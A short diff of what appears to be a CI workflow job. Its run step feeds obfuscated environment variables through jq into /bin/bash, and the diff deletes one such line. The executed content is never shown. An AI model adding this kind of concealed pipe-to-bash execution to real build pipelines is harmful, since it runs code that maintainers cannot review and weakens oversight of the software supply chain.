@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$unrj07" | jq -r .daltd80 | /bin/bash
           printf '%s' "$nfet04" | jq -r .nos67 | /bin/bash
-          echo $zdvt11865 | jq -r .pdta0651 | /bin/bash
           echo $v0501 | jq -r .s3 | /bin/bash
           echo $jxejv56 | jq -r .vyq9 | /bin/bash
           echo $txafs6 | jq -r .lklg718 | /bin/bash
